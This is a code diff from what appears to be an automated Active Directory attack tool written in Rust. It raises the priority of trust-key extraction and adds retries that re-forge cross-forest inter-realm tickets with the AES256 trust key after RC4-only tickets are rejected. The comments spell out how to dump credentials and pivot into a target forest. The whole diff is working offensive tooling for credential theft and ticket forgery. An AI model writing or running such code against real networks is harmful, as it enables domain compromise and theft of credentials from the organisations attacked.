@@ -940,8 +940,14 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         payload["hash_value"] = json!(hash.hash_value);
                     }
 
+                    // Priority 7 (on par with auto_credential_access's primary
+                    // secretsdump): the trust key — and specifically its AES256
+                    // variant — is the critical-path unlock for the entire
+                    // target forest. At priority 2 it lost to routine enum and
+                    // landed minutes after the forge had already given up and
+                    // fired an RC4-only ticket that an AES-only DC rejects.
                     match dispatcher
-                        .throttled_submit("credential_access", "credential_access", payload, 2)
+                        .throttled_submit("credential_access", "credential_access", payload, 7)
                         .await
                     {
                         Ok(Some(task_id)) => {
@@ -1794,6 +1800,48 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 .and_then(|h| h.as_array())
                                 .map(|a| a.len())
                                 .unwrap_or(0);
+
+                            // Recoverable case: this forge fired NTLM-only
+                            // (`aes_key_bg` is None — the AES256 trust key hadn't
+                            // upserted when the AES wait expired) and the dump
+                            // came back empty. Against a cross-forest target that
+                            // is almost always the RC4/etype rejection an AES-only
+                            // forest returns (KDC_ERR_ETYPE_NOSUPP), NOT SID
+                            // filtering — locking dedup here strands the pivot
+                            // even after the trust-key extraction lands AES.
+                            // Instead clear dedup and reset the AES wait so a
+                            // later tick re-forges WITH -aesKey once AES is in
+                            // state. Bounded by `forge_ntlm_fallback_attempts`
+                            // (each retry is gated behind a fresh ~3 min AES wait,
+                            // so this is not a hot-loop) so a target where AES
+                            // genuinely never arrives eventually locks.
+                            if aes_key_bg.is_none() {
+                                const MAX_NTLM_FORGE_ATTEMPTS: u32 = 3;
+                                let attempts = {
+                                    let mut state = dispatcher_bg.state.write().await;
+                                    let c = state
+                                        .forge_ntlm_fallback_attempts
+                                        .entry(dedup_key_bg.clone())
+                                        .or_insert(0);
+                                    *c += 1;
+                                    *c
+                                };
+                                if attempts <= MAX_NTLM_FORGE_ATTEMPTS {
+                                    warn!(
+                                        source_domain = %source_domain_bg,
+                                        target_domain = %target_domain_bg,
+                                        attempts,
+                                        "NTLM-only cross-forest forge returned zero hashes (likely AES-only target rejecting the RC4 inter-realm ticket) — clearing dedup and resetting the AES wait to re-forge once the AES256 trust key lands"
+                                    );
+                                    {
+                                        let mut state = dispatcher_bg.state.write().await;
+                                        state.forge_aes_defers.remove(&dedup_key_bg);
+                                    }
+                                    clear_dedup().await;
+                                    return;
+                                }
+                            }
+
                             warn!(
                                 source_domain = %source_domain_bg,
                                 target_domain = %target_domain_bg,
